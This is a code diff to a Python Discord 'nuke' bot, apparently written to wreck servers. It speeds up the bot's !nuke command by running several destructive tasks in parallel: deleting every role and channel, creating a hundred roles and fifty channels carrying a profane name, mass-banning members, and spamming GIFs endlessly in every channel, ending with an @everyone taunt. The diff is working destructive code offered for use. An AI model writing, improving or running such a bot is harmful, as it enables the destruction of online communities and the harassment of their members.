@@ -22,7 +22,7 @@ if not TOKEN:
 
 @bot.event
 async def on_ready():
-    print(f"[{bot.user}] Kieran Ultra Nuke Bot Online - READY")
+    print(f"[{bot.user}] Kieran Ultra Nuke Bot Online")
     await bot.change_presence(activity=discord.Game(name="Kieran Nuke"))
 
 async def set_kieran_icon(guild):
@@ -60,53 +60,62 @@ async def infinite_spam_task(channel):
 async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild
+    await ctx.send("🚀 **KIERAN ULTRA INSTANT NUKE PROTOCOL ACTIVATED - EVERYTHING AT ONCE**")
     
-    await ctx.send("🚀 **KIERAN NUKE STARTED - PHASE 1/4**")
     await set_kieran_icon(guild)
     
-    await ctx.send("🔄 Deleting roles...")
+    # === EVERYTHING IN PARALLEL FOR MAX SPEED ===
+    await asyncio.gather(
+        # Roles delete + create
+        asyncio.create_task(roles_nuke(guild)),
+        # Channels delete + create
+        asyncio.create_task(channels_nuke(guild)),
+        # Mass ban
+        asyncio.create_task(ban_nuke(guild)),
+        return_exceptions=True
+    )
+    
+    # Start infinite spam immediately
+    await asyncio.create_task(infinite_spam_nuke(guild))
+    
+    await ctx.send("@everyone **SERVER HAS BEEN INSTANTLY FUCKED BY KIERAN - INFINITE GIF SPAM ACTIVE**")
+    logging.info("ULTRA INSTANT NUKE COMPLETE")
+
+async def roles_nuke(guild):
+    logging.info("Roles nuke started")
     for role in reversed(list(guild.roles)):
         if role != guild.default_role and role != guild.me.top_role:
             await safe_delete(role)
-    await ctx.send("✅ Roles deleted")
-    
-    await ctx.send("🔄 Creating 100 new roles...")
     for _ in range(100):
         try:
             await guild.create_role(name="fucked by Kieran", colour=discord.Colour.random())
         except:
             pass
-    await ctx.send("✅ Roles created")
-    
-    await ctx.send("🔄 Deleting all channels...")
+    logging.info("Roles nuke done")
+
+async def channels_nuke(guild):
+    logging.info("Channels nuke started")
     for ch in list(guild.channels):
         await safe_delete(ch)
-    await ctx.send("✅ Channels deleted")
-    
-    await ctx.send("🔄 Creating 50 new channels...")
     for i in range(50):
         try:
             cat = await guild.create_category(f"fucked-by-kieran")
             await guild.create_text_channel("fucked-by-kieran", category=cat)
         except:
             pass
-    await ctx.send("✅ Channels created")
-    
-    await ctx.send("🔄 Banning all members...")
+    logging.info("Channels nuke done")
+
+async def ban_nuke(guild):
+    logging.info("Ban nuke started")
     members = list(guild.members)
     random.shuffle(members)
     for member in members:
         if member != guild.owner and member != bot.user and not member.bot:
             await safe_ban(member)
-    await ctx.send("✅ Mass ban complete")
-    
-    await ctx.send("🚀 **STARTING INFINITE GIF SPAM**")
-    await infinite_spam(ctx)
-    
-    await ctx.send("@everyone **SERVER HAS BEEN COMPLETELY FUCKED BY KIERAN**")
+    logging.info("Ban nuke done")
 
-async def infinite_spam(ctx):
-    guild = ctx.guild
+async def infinite_spam_nuke(guild):
+    logging.info("Infinite GIF spam started")
     channels_to_spam = guild.text_channels + [thread for thread in guild.threads]
     tasks = [infinite_spam_task(channel) for channel in channels_to_spam]
     await asyncio.gather(*tasks, return_exceptions=True)
